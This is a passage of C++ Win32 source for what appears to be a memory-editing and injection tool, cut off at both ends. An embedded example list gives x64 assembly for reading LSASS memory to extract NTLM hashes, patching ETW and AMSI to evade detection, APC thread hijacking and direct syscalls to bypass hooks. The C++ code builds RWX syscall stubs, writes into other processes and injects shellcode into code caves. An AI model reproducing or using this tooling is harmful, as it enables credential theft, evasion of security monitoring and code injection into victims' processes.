            "mov rdx, [rsp+0x28]           ; High part\r\n"
            "add rsp, 0x30\r\n"
            "ret\r\n\r\n"

            "Example 11: Read process memory via NtReadVirtualMemory (get data from another process)\r\n"
            "; Real use: read lsass or game memory (requires handle with PROCESS_VM_READ)\r\n"
            "mov [rsp+0x20], r9            ; Save requested size\r\n"
            "sub rsp, 0x28\r\n"
            "mov r9, [rsp+0x50]            ; BytesToRead (original param)\r\n"
            "lea rax, [rsp+0x48]           ; Pointer to BytesRead output\r\n"
            "push rax\r\n"
            "sub rsp, 0x20\r\n"
            "mov rcx, rcx                  ; ProcessHandle\r\n"
            "mov rdx, rdx                  ; BaseAddress\r\n"
            "mov r8, r8                    ; Buffer\r\n"
            "mov r9, r9                    ; NumberOfBytesToRead\r\n"
            "mov eax, 0x3F                 ; SSN for NtReadVirtualMemory\r\n"
            "syscall\r\n"
            "add rsp, 0x20\r\n"
            "pop rax\r\n"
            "add rsp, 0x28\r\n"
            "ret\r\n\r\n"

            "Example 12: Patch a single byte in current process memory (write via direct dereference)\r\n"
            "; Real use: change a conditional jump to NOP or modify a flag\r\n"
            "push rax\r\n"
            "mov rax, 0x00007FF1ABCD1234   ; Address to patch\r\n"
            "mov byte [rax], 0x90          ; Patch with NOP\r\n"
            "pop rax\r\n"
            "ret\r\n\r\n"

            "Example 13: Patch a DWORD value using NtProtectVirtualMemory + write (change game health/ammo)\r\n"
            "; Real use: cheat engine style memory editing with proper protection restoration\r\n"
            "sub rsp, 0x38\r\n"
            "; 1. Change protection to PAGE_READWRITE\r\n"
            "mov rcx, -1                   ; Current process\r\n"
            "lea rdx, [rel target_addr]    ; Address variable (holds 0x00007FF1ABCD0000)\r\n"
            "lea r8, [rsp+0x30]            ; OldProtect output\r\n"
            "mov r9, 0x04                  ; PAGE_READWRITE\r\n"
            "mov [r8], r9                  ; Placeholder\r\n"
            "mov eax, 0x50                 ; NtProtectVirtualMemory SSN\r\n"
            "syscall\r\n"
            "; 2. Write new DWORD value\r\n"
            "mov rcx, [rel target_addr]\r\n"
            "mov dword [rcx], 9999         ; New value (e.g., ammo)\r\n"
            "; 3. Restore original protection\r\n"
            "mov rcx, -1\r\n"
            "lea rdx, [rel target_addr]\r\n"
            "lea r8, [rsp+0x28]            ; OldProtect (from step 1)\r\n"
            "mov r9, [rsp+0x30]            ; Original protection\r\n"
            "mov eax, 0x50\r\n"
            "syscall\r\n"
            "add rsp, 0x38\r\n"
            "ret\r\n"
            "target_addr: dq 0x00007FF1ABCD0000  ; Replace with real address\r\n\r\n"

            "Example 14: Get module base address via PEB walk (no syscalls, pure shellcode)\r\n"
            "; Real use: find kernel32 base without using GetModuleHandle (evasive)\r\n"
            "xor rcx, rcx\r\n"
            "mov rcx, gs:[0x60]            ; PEB\r\n"
            "mov rcx, [rcx+0x18]           ; LDR\r\n"
            "mov rcx, [rcx+0x20]           ; InMemoryOrderModuleList (first module)\r\n"
            "mov rcx, [rcx]                ; Second module (ntdll)\r\n"
            "mov rcx, [rcx]                ; Third module (kernel32)\r\n"
            "mov rax, [rcx+0x20]           ; ImageBaseAddress\r\n"
            "ret\r\n\r\n"

            "Example 15: Query process handle count using NtQueryInformationProcess\r\n"
            "; Real use: detect handle dumping or debugger presence (low handle count?)\r\n"
            "sub rsp, 0x30\r\n"
            "mov rcx, -1                   ; Current process handle\r\n"
            "mov rdx, 0x15                 ; ProcessHandleCount (info class 0x15)\r\n"
            "lea r8, [rsp+0x20]            ; Output buffer (ULONG)\r\n"
            "mov r9, 0x08                  ; Buffer size\r\n"
            "mov eax, 0x38                 ; NtQueryInformationProcess SSN\r\n"
            "syscall\r\n"
            "mov eax, [rsp+0x20]           ; Handle count\r\n"
            "add rsp, 0x30\r\n"
            "ret\r\n\r\n"

            "Example 16: Patch a conditional jump to always take branch (force true)\r\n"
            "; Real use: bypass anti-debug or anti-tamper checks\r\n"
            "push rax\r\n"
            "mov rax, 0x00007FF1ABCD1000   ; Address of conditional jump (e.g., je 0x...)\r\n"
            "mov byte [rax], 0xEB          ; Change to JMP (short)\r\n"
            "; For long jumps: replace 0x0F84 (JZ rel32) with 0x0F85 (JNZ) or 0x90\x90\x90\x90\x90\xE9\r\n"
            "pop rax\r\n"
            "ret\r\n\r\n"

            "Example 17 (banana ccp): Enumerate running processes via NtQuerySystemInformation (SystemProcessInformation)\r\n"
            "; Real use: detect AV/EDR processes or find target PID for inj\r\n"
            "sub rsp, 0x1000\r\n"
            "mov rcx, 0x05                ; SystemProcessInformation class\r\n"
            "lea rdx, [rsp]               ; Buffer\r\n"
            "mov r8, 0x1000               ; Initial buffer size\r\n"
            "lea r9, [rsp+0x0FF8]         ; Return length\r\n"
            "mov eax, 0x36                ; NtQuerySystemInformation\r\n"
            "syscall\r\n"
            "; Walk the process list (simplified – real code would extract PID and name)\r\n"
            "mov rsi, [rsp]               ; First PROCESS_INFORMATION\r\n"
            ".loop:\r\n"
            "  mov ebx, [rsi+0x60]        ; Process ID\r\n"
            "  lea rdi, [rsi+0x68]        ; Image name (UNICODE_STRING Buffer)\r\n"
            "  ; ... (collection logic would go here)\r\n"
            "  mov rsi, [rsi+0x88]        ; Next entry offset\r\n"
            "  test rsi, rsi\r\n"
            "  jnz .loop\r\n"
            "add rsp, 0x1000\r\n"
            "ret\r\n\r\n"

            "Example 18 (banana ccp): Patch ETW (Event Tracing for Windows) to evade syscall monitoring\r\n"
            "; Real use: prevent ETW from logging syscall events (stealth)\r\n"
            "push rax\r\n"
            "mov rax, gs:[0x60]           ; PEB\r\n"
            "mov rax, [rax+0x18]          ; LDR\r\n"
            "mov rax, [rax+0x20]          ; InMemoryOrderModuleList\r\n"
            "mov rax, [rax]               ; ntdll\r\n"
            "mov rax, [rax+0x20]          ; ntdll base\r\n"
            "add rax, 0x12345678          ; RVA to EtwEventWrite (replace with actual offset)\r\n"
            "mov byte [rax], 0xC3         ; ret instruction\r\n"
            "pop rax\r\n"
            "ret\r\n\r\n"

            "Example 19 (banana ccp): Read LSASS process memory to extract credentials (NtReadVirtualMemory)\r\n"
            "; HIGH RISK – educational only. Requires LSASS handle with PROCESS_VM_READ\r\n"
            "sub rsp, 0x30\r\n"
            "mov rcx, rcx                 ; LSASS handle (obtained via OpenProcess with PID=0x2A8 typically)\r\n"
            "mov rdx, 0x7FF123450000      ; Target address inside LSASS (e.g., credential region)\r\n"
            "lea r8, [rsp+0x20]           ; Local buffer (size 0x1000)\r\n"
            "mov r9, 0x1000               ; Bytes to read\r\n"
            "mov eax, 0x3F                ; NtReadVirtualMemory\r\n"
            "syscall\r\n"
            "; Buffer [rsp+0x20] now contains sensitive data (e.g., NTLM hashes)\r\n"
            "add rsp, 0x30\r\n"
            "ret\r\n\r\n"

            "Example 20 (banana ccp): Hijack thread execution via APC inj (NtQueueApcThread)\r\n"
            "; Real use: execute shellcode in the context of an alertable thread (e.g., explorer.exe)\r\n"
            "sub rsp, 0x28\r\n"
            "mov rcx, r9                  ; Thread handle (alertable)\r\n"
            "mov rdx, [rsp+0x48]          ; APC routine (shellcode address)\r\n"
            "xor r8, r8                   ; SystemArgument1\r\n"
            "xor r9, r9                   ; SystemArgument2\r\n"
            "mov eax, 0x4D                ; NtQueueApcThread (SSN varies)\r\n"
            "syscall\r\n"
            "add rsp, 0x28\r\n"
            "ret\r\n\r\n"

            "Example 21 (banana ccp): Patch amsi.dll to disable scanning (AmsiScanBuffer)\r\n"
            "; Real use: bypass AMSI for in‑memory .NET or PowerShell payloads\r\n"
            "push rax\r\n"
            "mov rax, 0x00007FFE12340000  ; Base of amsi.dll (find using PEB walk first)\r\n"
            "add rax, 0x1A2B3C            ; Offset to AmsiScanBuffer (real offset varies by Windows build)\r\n"
            "; Patch to 'xor eax, eax ; ret 0x14' – returns AMSI_RESULT_CLEAN\r\n"
            "mov word [rax], 0x31C0       ; xor eax, eax\r\n"
            "mov word [rax+2], 0x14C2     ; ret 0x14\r\n"
            "pop rax\r\n"
            "ret\r\n\r\n"

            "Example 22 (banana ccp): Install direct system call proxy to bypass user‑land hooks\r\n"
            "; Real use: call NtWriteVirtualMemory using a fresh, unmodified copy of ntdll\r\n"
            "; Assumes fresh ntdll base is in R14, SSN for the desired syscall is in R15\r\n"
            "sub rsp, 0x28\r\n"
            "mov rcx, -1                  ; ProcessHandle\r\n"
            "mov rdx, [rsp+0x30]          ; BaseAddress\r\n"
            "mov r8, [rsp+0x38]           ; Buffer\r\n"
            "mov r9, [rsp+0x40]           ; NumberOfBytes\r\n"
            "lea rax, [rsp+0x20]          ; BytesWritten output\r\n"
            "mov [rax], 0\r\n"
            "mov eax, r15d                ; SSN (from fresh ntdll)\r\n"
            "syscall\r\n"
            "add rsp, 0x28\r\n"
            "ret\r\n\r\n");
        HWND hBtn=CreateWindowA("BUTTON","Assemble",WS_CHILD|WS_VISIBLE,10,308,110,26,hWnd,(HMENU)ID_BTN_ASSEMBLE,hInst,NULL);
        SendMessage(hBtn,WM_SETFONT,(WPARAM)fNorm,TRUE);
        hErr=CreateWindowA("STATIC","",WS_CHILD|WS_VISIBLE,130,314,550,18,hWnd,NULL,hInst,NULL);
        SendMessage(hErr,WM_SETFONT,(WPARAM)fNorm,TRUE);
        h=CreateWindowA("STATIC","Output hex bytes:",WS_CHILD|WS_VISIBLE,10,344,180,18,hWnd,NULL,hInst,NULL);
        SendMessage(h,WM_SETFONT,(WPARAM)fNorm,TRUE);
        hOut=CreateWindowA("EDIT","",WS_CHILD|WS_VISIBLE|WS_BORDER|ES_AUTOHSCROLL,
            10,364,545,24,hWnd,(HMENU)ID_EDIT_ASM_OUT,hInst,NULL);
        SendMessage(hOut,WM_SETFONT,(WPARAM)fMono,TRUE);
        HWND hSend=CreateWindowA("BUTTON","Send to SC Field",WS_CHILD|WS_VISIBLE,562,362,118,26,hWnd,(HMENU)ID_BTN_ASM_TO_SC,hInst,NULL);
        SendMessage(hSend,WM_SETFONT,(WPARAM)fNorm,TRUE);
        return 0;
    }
    case WM_COMMAND:{
        if(LOWORD(wParam)==ID_BTN_ASSEMBLE){
            char src[8192]={};GetWindowTextA(hSrc,src,8192);
            std::string result=AssembleSource(src);
            bool ok=(result.find("Line ")==std::string::npos&&result.find("ERROR")==std::string::npos);
            SetWindowTextA(hErr,ok?("OK - "+std::to_string((result.size()+1)/3)+" bytes").c_str():result.c_str());
            SetWindowTextA(hOut,ok?result.c_str():"");
        }
        if(LOWORD(wParam)==ID_BTN_ASM_TO_SC){
            char buf[4096]={};GetWindowTextA(hOut,buf,4096);
            if(buf[0]){SetWindowTextA(hEditShellcode,buf);LogToStatus("Assembled shellcode sent to inj field");}
        }
        return 0;
    }
    case WM_DESTROY:hWndAssembler=NULL;return 0;
    }
    return DefWindowProc(hWnd,msg,wParam,lParam);
}

void ShowAssemblerWindow(){
    if(hWndAssembler&&IsWindow(hWndAssembler)){SetForegroundWindow(hWndAssembler);return;}
    static bool reg=false;
    if(!reg){WNDCLASSA wc={};wc.lpfnWndProc=AsmWndProc;wc.hInstance=hInst;wc.hbrBackground=(HBRUSH)(COLOR_BTNFACE+1);wc.lpszClassName="AsmWnd";wc.hCursor=LoadCursor(NULL,IDC_ARROW);RegisterClassA(&wc);reg=true;}
    hWndAssembler=CreateWindowExA(0,"AsmWnd","Assembly -> Shellcode  (Intel x64)",WS_OVERLAPPED|WS_CAPTION|WS_SYSMENU|WS_VISIBLE,200,150,692,408,hMainWnd,NULL,hInst,NULL);
}


static void ParseAndSelectAddressFromLine(HWND hEdit){
    int sel=0;SendMessage(hEdit,EM_GETSEL,(WPARAM)&sel,0);
    int lineIdx=(int)SendMessage(hEdit,EM_LINEFROMCHAR,(WPARAM)sel,0);
    int lineStart=(int)SendMessage(hEdit,EM_LINEINDEX,(WPARAM)lineIdx,0);
    int lineLen=(int)SendMessage(hEdit,EM_LINELENGTH,(WPARAM)lineStart,0);
    if(lineLen<=0||lineLen>=512)return;
    std::string buf(lineLen+2,'\0');
    buf[0]=(char)(lineLen&0xFF);buf[1]=(char)((lineLen>>8)&0xFF);
    SendMessageA(hEdit,EM_GETLINE,(WPARAM)lineIdx,(LPARAM)&buf[0]);
    const char* p=strstr(buf.c_str(),"0x");
    if(!p)return;
    uintptr_t fa=(uintptr_t)strtoull(p+2,nullptr,16);
    if(!fa||fa<=(uintptr_t)0x10000)return;
    for(size_t i=0;i<scanResults.size();i++){
        if((uintptr_t)scanResults[i]==fa){
            SetSelectedAddress(scanResults[i]);
            LPVOID addr = GetSelectedAddress();
            int curVal=ReadValueFromAddress(addr);
            SetWindowTextA(hEditNewValue,std::to_string(curVal).c_str());
            LPVOID base=GetBaseAddress();
            LONGLONG off=base?((LONGLONG)(uintptr_t)addr-(LONGLONG)(uintptr_t)base):0;
            char info[512];
            sprintf_s(info,"Selected: 0x%p  |  Offset: +0x%llX  |  int32: %d",addr,off,curVal);
            SetWindowTextA(hStaticAddressInfo,info);
            char offStr[32];sprintf_s(offStr,"0x%llX",off);
            SetWindowTextA(hEditTrackedOffset,offStr);
            char addrHex[32];sprintf_s(addrHex,"0x%llX",(uintptr_t)addr);
            SetWindowTextA(hEditScAddr,addrHex);
            EnableWindow(hBtnWrite,TRUE);EnableWindow(hBtnUndo,TRUE);
            ShowHexAtAddress(addr,addr);
            return;
        }
    }
    SetSelectedAddress((LPVOID)fa);
    LPVOID addr = GetSelectedAddress();
    char info[256];sprintf_s(info,"Selected (manual): 0x%llX",(unsigned long long)(uintptr_t)addr);
    SetWindowTextA(hStaticAddressInfo,info);
    char addrHex[32];sprintf_s(addrHex,"0x%llX",(uintptr_t)addr);
    SetWindowTextA(hEditScAddr,addrHex);
    ShowHexAtAddress(addr,addr);
}

LRESULT CALLBACK ScanEditSubclassProc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
    if(msg==WM_LBUTTONUP){
        LRESULT r=CallWindowProcA(g_origScanEditProc,hWnd,msg,wParam,lParam);
        ParseAndSelectAddressFromLine(hWnd);
        return r;
    }
    if(msg==WM_LBUTTONDBLCLK){
        ParseAndSelectAddressFromLine(hWnd);
        return 0;
    }
    return CallWindowProcA(g_origScanEditProc,hWnd,msg,wParam,lParam);
}

static DWORD GetNtApiSyscallNumber(const char* procName) {
    HMODULE hNt = GetModuleHandleA("ntdll.dll");
    if (!hNt) return 0;
    FARPROC proc = GetProcAddress(hNt, procName);
    if (!proc) return 0;
    unsigned char* code = (unsigned char*)proc;
    if (code[0]==0x4C && code[1]==0x8B && code[2]==0xD1 && code[3]==0xB8) {
        return *(DWORD*)(code + 4);
    }
    return 0;
}

static LPVOID BuildSyscallStub(DWORD ssn) {
    unsigned char stub[] = { 0x4C,0x8B,0xD1,0xB8,0,0,0,0,0x0F,0x05,0xC3 };
    LPVOID mem = VirtualAlloc(NULL, sizeof(stub), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return nullptr;
    memcpy(mem, stub, sizeof(stub));
    *(DWORD*)((unsigned char*)mem + 4) = ssn;
    FlushInstructionCache(GetCurrentProcess(), mem, sizeof(stub));
    return mem;
}

typedef LONG NTSTATUS;
typedef NTSTATUS (NTAPI* NtWriteVirtualMemory_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS (NTAPI* NtProtectVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

static bool SyscallWriteVirtualMemory(HANDLE process, PVOID baseAddress, const void* buffer, SIZE_T bufferSize, SIZE_T* bytesWritten) {
    DWORD ssn = GetNtApiSyscallNumber("NtWriteVirtualMemory");
    if (!ssn) return false;
    LPVOID stub = BuildSyscallStub(ssn);
    if (!stub) return false;
    auto fn = (NtWriteVirtualMemory_t)stub;
    NTSTATUS status = fn(process, baseAddress, const_cast<void*>(buffer), bufferSize, bytesWritten);
    VirtualFree(stub, 0, MEM_RELEASE);
    return status >= 0 && (!bytesWritten || *bytesWritten == bufferSize);
}

static bool SyscallProtectVirtualMemory(HANDLE process, PVOID baseAddress, SIZE_T regionSize, DWORD newProtect, DWORD* oldProtect) {
    DWORD ssn = GetNtApiSyscallNumber("NtProtectVirtualMemory");
    if (!ssn) return false;
    LPVOID stub = BuildSyscallStub(ssn);
    if (!stub) return false;
    auto fn = (NtProtectVirtualMemory_t)stub;
    PVOID addr = baseAddress;
    SIZE_T size = regionSize;
    ULONG oldp = 0;
    NTSTATUS status = fn(process, &addr, &size, newProtect, &oldp);
    if (oldProtect) *oldProtect = oldp;
    VirtualFree(stub, 0, MEM_RELEASE);
    return status >= 0;
}

bool WriteTypedValue(LPVOID address, const char* str, int dt, bool protect, bool useSyscall) {
    if (!hProcess || !address) return false;
    BYTE buf[16] = {};
    size_t sz = 4;
    bool isVar = false;
    std::vector<BYTE> varBytes;
    switch (dt) {
        case DT_INT8:  { int8_t  v=(int8_t)atoi(str);   memcpy(buf,&v,1); sz=1; break; }
        case DT_INT16: { int16_t v=(int16_t)atoi(str);  memcpy(buf,&v,2); sz=2; break; }
        case DT_INT64: { int64_t v=_strtoi64(str,NULL,10); memcpy(buf,&v,8); sz=8; break; }
        case DT_FLOAT: { float   v=(float)atof(str);    memcpy(buf,&v,4); sz=4; break; }
        case DT_DOUBLE:{ double  v=atof(str);            memcpy(buf,&v,8); sz=8; break; }
        case DT_STRING:{ sz=strlen(str)+1; varBytes.assign(str,str+sz); isVar=true; break; }
        case DT_AOB: {
            std::vector<bool> mask;
            if (!ParseAOB(str,varBytes,mask)||varBytes.empty()) return false;
            sz=varBytes.size(); isVar=true; break;
        }
        default: { int32_t v=atoi(str); memcpy(buf,&v,4); sz=4; break; }
    }
    const BYTE* data = isVar ? varBytes.data() : buf;
    DWORD oldProt = 0;
    if (protect) {
        if (useSyscall) {
            if (!SyscallProtectVirtualMemory(hProcess,address,sz,PAGE_EXECUTE_READWRITE,&oldProt)) return false;
        } else {
            if (!VirtualProtectEx(hProcess,address,sz,PAGE_EXECUTE_READWRITE,&oldProt)) return false;
        }
    }
    SIZE_T w = 0;
    bool ok = false;
    if (useSyscall) {
        ok = SyscallWriteVirtualMemory(hProcess,address,data,sz,&w);
    } else {
        ok = WriteProcessMemory(hProcess,address,data,sz,&w) && w==sz;
    }
    if (protect && oldProt) {
        if (useSyscall) SyscallProtectVirtualMemory(hProcess,address,sz,oldProt,nullptr);
        else VirtualProtectEx(hProcess,address,sz,oldProt,&oldProt);
    }
    return ok;
}

void WriteAllScanResults() {
    if (!hProcess||scanResults.empty()){LogToStatus("No scan results to write to",true);return;}
    int dt=(int)SendMessage(hCmbDataType,CB_GETCURSEL,0,0);
    char valStr[512]={};GetWindowTextA(hEditNewValue,valStr,512);
    bool prot=(SendMessage(hChkProtect,BM_GETCHECK,0,0)==BST_CHECKED);
    bool useSyscall=(SendMessage(hChkSyscall,BM_GETCHECK,0,0)==BST_CHECKED);
    int ok=0,fail=0;
    for (LPVOID addr:scanResults){if(WriteTypedValue(addr,valStr,dt,prot,useSyscall))ok++;else fail++;}
    char msg[128];sprintf_s(msg,"Bulk write: %d OK, %d failed (of %zu)%s",ok,fail,scanResults.size(),useSyscall?" (syscall)":"");
    LogToStatus(msg);
}

void SuspendResumeProcess(bool doSuspend) {
    if (!currentPID){LogToStatus("No process attached",true);return;}
    HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD,0);
    if (snap==INVALID_HANDLE_VALUE){LogToStatus("Thread snapshot failed",true);return;}
    THREADENTRY32 te;te.dwSize=sizeof(te);int count=0;
    if (Thread32First(snap,&te)){
        do {
            if (te.th32OwnerProcessID!=currentPID) continue;
            HANDLE hTh=OpenThread(THREAD_SUSPEND_RESUME,FALSE,te.th32ThreadID);
            if (hTh){if(doSuspend)SuspendThread(hTh);else ResumeThread(hTh);CloseHandle(hTh);count++;}
        } while (Thread32Next(snap,&te));
    }
    CloseHandle(snap);
    char msg[128];sprintf_s(msg,"%s %d thread(s) in PID %d",doSuspend?"Suspended":"Resumed",count,currentPID);
    LogToStatus(msg);
}

void InjectIntoCodeCave() {
    if (!hProcess){LogToStatus("No process attached",true);return;}
    char scText[4096]={};GetWindowTextA(hEditShellcode,scText,sizeof(scText));
    std::vector<BYTE> scBytes;std::vector<bool> scMask;
    if (!ParseAOB(scText,scBytes,scMask)||scBytes.empty()){LogToStatus("Enter shellcode hex bytes first",true);return;}
    int sel=0;SendMessage(hLstCaves,EM_GETSEL,(WPARAM)&sel,0);
    int li=(int)SendMessage(hLstCaves,EM_LINEFROMCHAR,(WPARAM)sel,0);
    int ls=(int)SendMessage(hLstCaves,EM_LINEINDEX,(WPARAM)li,0);
    int ll=(int)SendMessage(hLstCaves,EM_LINELENGTH,(WPARAM)ls,0);
    if (ll<=0||ll>=512){LogToStatus("Click a code cave line first (Scan Caves)",true);return;}
    std::string cbuf(ll+2,'\0');cbuf[0]=(char)(ll&0xFF);cbuf[1]=(char)((ll>>8)&0xFF);
    SendMessageA(hLstCaves,EM_GETLINE,(WPARAM)li,(LPARAM)&cbuf[0]);
    const char* cp=strstr(cbuf.c_str(),"0x");
    if (!cp){LogToStatus("Could not parse cave address",true);return;}
    LPVOID caveAddr=(LPVOID)(uintptr_t)strtoull(cp+2,nullptr,16);
    if (!caveAddr){LogToStatus("Invalid cave address",true);return;}
    DWORD oldProt=0;
    VirtualProtectEx(hProcess,caveAddr,scBytes.size(),PAGE_EXECUTE_READWRITE,&oldProt);
    SIZE_T w;
    if (!WriteProcessMemory(hProcess,caveAddr,scBytes.data(),scBytes.size(),&w)){
        LogToStatus("Write to cave failed",true);return;
    }
    if (oldProt) VirtualProtectEx(hProcess,caveAddr,scBytes.size(),oldProt,&oldProt);
    char msg[256];sprintf_s(msg,"Wrote %zu bytes to cave @ 0x%p",scBytes.size(),caveAddr);
    LogToStatus(msg);ShowHexAtAddress(caveAddr,caveAddr);
}

void KillSelectedThread() {
    int sel=0;SendMessage(hLstThreads,EM_GETSEL,(WPARAM)&sel,0);
    int li=(int)SendMessage(hLstThreads,EM_LINEFROMCHAR,(WPARAM)sel,0);
    int ls=(int)SendMessage(hLstThreads,EM_LINEINDEX,(WPARAM)li,0);
    int ll=(int)SendMessage(hLstThreads,EM_LINELENGTH,(WPARAM)ls,0);
    if (ll<=0||ll>=512){LogToStatus("Click a thread line first",true);return;}
    std::string buf(ll+2,'\0');buf[0]=(char)(ll&0xFF);buf[1]=(char)((ll>>8)&0xFF);
    SendMessageA(hLstThreads,EM_GETLINE,(WPARAM)li,(LPARAM)&buf[0]);
    const char* p=strstr(buf.c_str(),"TID: ");
    if (!p){LogToStatus("Could not parse TID",true);return;}
    DWORD tid=(DWORD)atoi(p+5);
    if (!tid){LogToStatus("Invalid TID",true);return;}
    HANDLE hTh=OpenThread(THREAD_TERMINATE,FALSE,tid);
    if (!hTh){char msg[128];sprintf_s(msg,"OpenThread failed TID %lu: %lu",tid,GetLastError());LogToStatus(msg,true);return;}
    if (TerminateThread(hTh,0)){char msg[128];sprintf_s(msg,"Terminated TID %lu",tid);LogToStatus(msg);}
    else {char msg[128];sprintf_s(msg,"TerminateThread failed TID %lu: %lu",tid,GetLastError());LogToStatus(msg,true);}
    CloseHandle(hTh);ListRemoteThreads();
}

void UpdateSelectedWindowInfo(HWND target) {
    if (!hStaticSelWnd) return;
    if (!target||!IsWindow(target)){
        g_targetWnd=NULL;
        SetWindowTextA(hStaticSelWnd,"Selected: None  (click a line in the list above)");
        return;
    }
    g_targetWnd=target;
    char cls[64]={},title[256]={};
    GetClassNameA(target,cls,64);GetWindowTextA(target,title,256);
    RECT rc={};GetWindowRect(target,&rc);
    DWORD pid=0;GetWindowThreadProcessId(target,&pid);
    char info[640];
    sprintf_s(info,"Selected: 0x%p  [%-20s]  \"%s\"  |  Rect: %d,%d-%d,%d  |  PID: %lu  |  Visible: %s  |  Enabled: %s",
        (void*)target,cls,title,rc.left,rc.top,rc.right,rc.bottom,pid,
        IsWindowVisible(target)?"Yes":"No",IsWindowEnabled(target)?"Yes":"No");
    SetWindowTextA(hStaticSelWnd,info);
}

static struct { DWORD pid; HWND hList; int count; } g_wndEnum;

BOOL CALLBACK WndEnumChildProc(HWND hwnd, LPARAM){
    char cls[64]={},title[128]={};
    GetClassNameA(hwnd,cls,64);GetWindowTextA(hwnd,title,128);
    char line[320];
    sprintf_s(line,"  +- CHILD  0x%p  [%-18s]  \"%s\"",(void*)hwnd,cls,title);
    AppendEditText(g_wndEnum.hList,line);
    return TRUE;
}
BOOL CALLBACK WndEnumTopProc(HWND hwnd, LPARAM){
    DWORD pid; GetWindowThreadProcessId(hwnd,&pid);
    if(pid!=g_wndEnum.pid) return TRUE;
    char cls[64]={},title[128]={};
    GetClassNameA(hwnd,cls,64);GetWindowTextA(hwnd,title,128);
    char line[320];
    sprintf_s(line,"TOP     0x%p  [%-18s]  \"%s\"",(void*)hwnd,cls,title);
    AppendEditText(g_wndEnum.hList,line);
    g_wndEnum.count++;
    EnumChildWindows(hwnd,WndEnumChildProc,0);
    return TRUE;
}

static HWND ParseHWNDFromEditLine(HWND hEdit){
    int sel=0; SendMessage(hEdit,EM_GETSEL,(WPARAM)&sel,0);
    int li=(int)SendMessage(hEdit,EM_LINEFROMCHAR,(WPARAM)sel,0);
    int ls=(int)SendMessage(hEdit,EM_LINEINDEX,(WPARAM)li,0);
    int ll=(int)SendMessage(hEdit,EM_LINELENGTH,(WPARAM)ls,0);
    if(ll<=0||ll>=512) return NULL;
    std::string buf(ll+2,'\0');
    buf[0]=(char)(ll&0xFF);buf[1]=(char)((ll>>8)&0xFF);
    SendMessageA(hEdit,EM_GETLINE,(WPARAM)li,(LPARAM)&buf[0]);
    const char* p=strstr(buf.c_str(),"0x");
    if(!p) return NULL;
    uintptr_t v=(uintptr_t)strtoull(p+2,nullptr,16);
    return v?(HWND)v:NULL;
}

void EnumerateProcessWindows(){
    if(!currentPID){LogToStatus("Attach to a process first",true);return;}
    ClearEditText(hLstWindows);
    AppendEditText(hLstWindows,"Type     HWND             [Class             ]  Title");
    AppendEditText(hLstWindows,"---------+-----------------+--------------------+-------------------");
    g_wndEnum={currentPID,hLstWindows,0};
    EnumWindows(WndEnumTopProc,0);
    char msg[128];sprintf_s(msg,"Found %d top-level window(s) for PID %d",g_wndEnum.count,currentPID);
    LogToStatus(msg);
}

LRESULT CALLBACK WndListSubclassProc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
    if (msg==WM_LBUTTONUP){
        LRESULT r=CallWindowProcA(g_origWndListProc,hWnd,msg,wParam,lParam);
        UpdateSelectedWindowInfo(ParseHWNDFromEditLine(hWnd));
        return r;
    }
    return CallWindowProcA(g_origWndListProc,hWnd,msg,wParam,lParam);
}


LRESULT CALLBACK TabPageProc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
    switch(msg){
    case WM_ERASEBKGND:{
        HDC hdc=(HDC)wParam;RECT rc;GetClientRect(hWnd,&rc);
        FillRect(hdc,&rc,hBrushWindow);return 1;
    }
    case WM_CTLCOLOREDIT:
    case WM_CTLCOLORSTATIC:
    case WM_CTLCOLORLISTBOX:
        return SendMessage(hMainWnd,msg,wParam,lParam);
    case WM_COMMAND:
    case WM_NOTIFY:
        SendMessage(hMainWnd,msg,wParam,lParam);
        return 0;
    }
    return DefWindowProc(hWnd,msg,wParam,lParam);
}


static bool ReadDiskFileFully(const char* path, std::vector<BYTE>& out){
    HANDLE h=CreateFileA(path,GENERIC_READ,FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE,
                         NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
    if(h==INVALID_HANDLE_VALUE)return false;
    LARGE_INTEGER sz;
    if(!GetFileSizeEx(h,&sz)||sz.QuadPart<=0||sz.QuadPart>0x10000000){CloseHandle(h);return false;}
    out.resize((size_t)sz.QuadPart);
    DWORD got=0;
    BOOL ok=ReadFile(h,out.data(),(DWORD)out.size(),&got,NULL);
    CloseHandle(h);
    return ok&&got==out.size();
}

struct ModRange { uintptr_t base; uintptr_t end; std::string name; };

static void CompareExecSections(LPVOID modBase,const char* modPath,const std::string& modName,
                                std::vector<BYTE>& disk, int& findingsAdded){
    if(disk.size()<sizeof(IMAGE_DOS_HEADER))return;
    IMAGE_DOS_HEADER* dDos=(IMAGE_DOS_HEADER*)disk.data();
    if(dDos->e_magic!=IMAGE_DOS_SIGNATURE)return;
    if((size_t)dDos->e_lfanew+sizeof(IMAGE_NT_HEADERS)>disk.size())return;
    IMAGE_NT_HEADERS* dNt=(IMAGE_NT_HEADERS*)(disk.data()+dDos->e_lfanew);
    if(dNt->Signature!=IMAGE_NT_SIGNATURE)return;
#ifdef _WIN64
    if(dNt->FileHeader.Machine!=IMAGE_FILE_MACHINE_AMD64)return;
#else
    if(dNt->FileHeader.Machine!=IMAGE_FILE_MACHINE_I386)return;
#endif
    WORD nSec=dNt->FileHeader.NumberOfSections;
    IMAGE_SECTION_HEADER* dSec=IMAGE_FIRST_SECTION(dNt);
    SIZE_T r=0;
    for(WORD i=0;i<nSec;i++){
        IMAGE_SECTION_HEADER& s=dSec[i];
        if(!(s.Characteristics&IMAGE_SCN_MEM_EXECUTE))continue;
        DWORD vs=s.Misc.VirtualSize, rs=s.SizeOfRawData;
        DWORD cmp=vs<rs?vs:rs;
        if(cmp==0)continue;
        if(cmp>0x200000)cmp=0x200000;
        if((size_t)s.PointerToRawData+cmp>disk.size())continue;
        std::vector<BYTE> mem(cmp);
        if(!ReadProcessMemory(hProcess,(LPVOID)((BYTE*)modBase+s.VirtualAddress),mem.data(),cmp,&r)||r!=cmp)continue;
        const BYTE* fbuf=disk.data()+s.PointerToRawData;
        size_t diff=0,maxRun=0,curRun=0,firstDiff=(size_t)-1;
        for(size_t k=0;k<cmp;k++){
